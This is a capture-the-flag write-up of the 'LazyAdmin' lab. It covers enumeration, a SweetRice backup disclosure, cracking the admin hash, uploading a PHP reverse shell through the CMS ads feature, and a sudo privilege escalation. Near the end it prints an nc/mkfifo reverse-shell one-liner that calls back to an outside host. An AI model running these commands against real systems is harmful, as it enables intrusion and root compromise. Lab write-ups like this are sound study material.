# LazyAdmin

> RedAiden

## Enumeration

### Nmap
Let's start with a quick Nmap scan.

`nmap -sC -sV 10.10.x.x`

```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:57:B0:67:B7:D3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see that it has port 80 open, and if we acces it we get a default Apache page.

### gobuster 
Start a quick gobuster scan to search for hidden directories.

`gobuster dir -u http://10.10.213.143:80 -w /usr/share/wordlists/dirb/big.txt`

```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/content (Status: 301)
/server-status (Status: 403)
```
If we enter the `/content` we can see a hyperlink that takes us to a website management system called SweetRice.

## searchsploit
Search for any vulnerabilities regarding SweetRice

`searchsploit sweetrice`

```
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                  | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                               | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                  | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                      | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                             | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                        | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                    | php/webapps/14184.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
We can see numerous exploits, but two of them catch my eye:
- Arbitrary File Upload (To upload malicious code)
- PHP Code Execution (Execute a reverse shell)
- Backup Disclosure (Get some admin information)

### Poking around

1. After reading the exploits, we can try to use 40718 to get some information from the backups. If we read the document `cat /usr/share/exploitdb/exploits/php/webapps/40718.txt` we can see that we can access a mysql backup in `/inc/mysql_backup`. So our URL would look like this `http://10.10.x.x:80/content/inc/mysql_backup`
2. Acces the new found page and download the mysql backup file.
3. After reading the file we can find some useful information:
```php
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{
    s:4:\\"name\\";
    s:25:\\"Lazy Admin&#039;
    s Website\\";
    s:6:\\"author\\";
    s:10:\\"Lazy Admin\\";
    s:5:\\"title\\";
    s:0:\\"\\";
    s:8:\\"keywords\\";
    s:8:\\"Keywords\\";
    s:11:\\"description\\";
    s:11:\\"Description\\";
    s:5:\\"admin\\"
    ;s:7:\\"manager\\";
    s:6:\\"passwd\\";
    s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
    s:5:\\"close\\";
    i:1;s:9:\\"close_tip\\";
    s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";
    s:5:\\"cache\\";
    i:0;
    s:13:\\"cache_expired\\";
    i:0;
    s:10:\\"user_track\\";
    i:0;
    s:11:\\"url_rewrite\\";
    i:0;
    s:4:\\"logo\\";
    s:0:\\"\\";
    s:5:\\"theme\\";
    s:0:\\"\\";
    s:4:\\"lang\\";
    s:9:\\"en-us.php\\";
    s:11:\\"admin_email\\";
    N;}\',\'1575023409\');'
```
- Admin username: `manager`
- Password: `42f749ade7f9e195bf475f37a44cafcb`
4. The password looks like a hash, so we are going to use crackstation to crack it.
    - Unhashed: `Password123`

Since the site is "building", we need to find a place where we can login. We can do another gobuster scan with the extended URL.

`gobuster dir -u http://10.10.x.x:80/content/ -w /usr/share/wordlists/dirb/big.txt`

```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/_themes (Status: 301)
/as (Status: 301)
/attachment (Status: 301)
/images (Status: 301)
/inc (Status: 301)
/js (Status: 301)
```
If we enter the `/as` directory, we get a login form. We can login using our found credentials.

## Exploitation

We can now use the Arbitrary File Upload exploit to upload our malicious PHP.

1. On the menu to the right, navigate to the Ads section. 
2. In here we can create an ad that runs code. I named mine `hacked`
3. In the __Ads code__ section paste a reverse shell script. [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) has a very good one.
   - Make sure to modify the IP and the port 
4. Click the Done button to add your Ad.
5. Start a Netcat listener on your machine with the port you used on the script `nc -lvnp 4444`
6. Navigate to `http://10.10.x.x:80/inc/`
7. Click on the `ads/` folder
8. Click on your script. You should get a reverse shell back.

## Privilege Escalation

First we can check for our sudo privileges with `sudo -l`. We get the following output:
```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
We can see that we are allowd to run a perl script called `backup.pl`. If we read it we get the following:\
`cat /home/itguy/backup.pl`
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
Another script is run by this script. Let's read that one as well:\
`cat /etc/copy.sh`
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
This for some reason has a reverse shell. We can check the file permissions:\
`ls -la /etc/copy.sh`
```
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Before we continue with the Privilege Escalation, we can look for the first user flag. From the first sudo command we noticed the user called `itguy`. If we change into its directory `cd /home/itguy/` we can find the flag.

From the file permissions we know that we can overwrite this and change the IP and PORT to create another reverse shell with sudo privileges.\
`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.79.128 5554 >/tmp/f' > /etc/copy.sh`\

Let's start another netcat listener on 5554. Then run the script with sudo privileges:\
`sudo /usr/bin/perl /home/itguy/backup.pl`\

On your netcat listener you should now have a shell with root privileges. Change into the root folder `cd /root` to find your flag.
